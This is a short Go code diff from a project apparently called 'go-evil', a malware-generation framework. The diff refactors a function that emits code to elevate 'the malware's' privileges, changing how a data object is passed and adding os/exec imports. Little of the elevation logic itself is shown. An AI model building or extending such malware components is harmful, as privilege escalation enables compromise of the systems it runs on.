@@ -3,13 +3,12 @@ package systemcommands
 import (
 	"fmt"
 
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Tries to do a so-called "regular" elevation of the malwares priviliges
-func Elevate(value string, s_json string) ([]string, string) {
-	data_object := structure.Receive(s_json)
+func Elevate(value string, data_object *json.Json_t) []string {
 	function_call := "elevate"
 
 	body := []string{"if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}
@@ -31,6 +30,6 @@ func Elevate(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("os/exec")
 
-	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
+	return []string{fmt.Sprintf("%s()", function_call)}
 
 }
